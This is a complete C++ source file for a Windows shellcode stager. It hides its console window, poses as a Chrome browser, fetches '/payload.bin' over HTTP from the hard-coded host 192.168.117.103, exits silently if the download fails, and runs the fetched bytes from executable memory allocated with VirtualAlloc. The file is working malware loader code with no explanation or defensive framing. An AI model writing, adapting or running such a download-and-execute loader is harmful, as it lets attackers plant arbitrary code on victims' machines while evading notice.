#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment (lib, "Wininet.lib")


struct Shellcode {
	byte* data;
	DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port);
void Execute(Shellcode shellcode);

void main() {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	Shellcode shellcode = Download(L"192.168.117.103", 80);
	Execute(shellcode);

}

Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
	HINTERNET session = InternetOpen(
		L"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET connection = InternetConnect(
		session,
		host,
		port,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET request = HttpOpenRequest(
		connection,
		L"GET",
		L"/payload.bin",
		NULL,
		NULL,
		NULL,
		0,
		0);

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {

		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0);
		}
	}

	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* payload = (byte*)malloc(capacity);

	DWORD payloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			exit(0);
		}

		if (bytesRead == 0) break;

		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newPayload = (byte*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}
	byte* newPayload = (byte*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	struct Shellcode out;
	out.data = payload;
	out.len = payloadSize;
	return out;
}

void Execute(Shellcode shellcode) {
	void* exec = VirtualAlloc(0, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode.data, shellcode.len);
	((void(*)())exec)();
}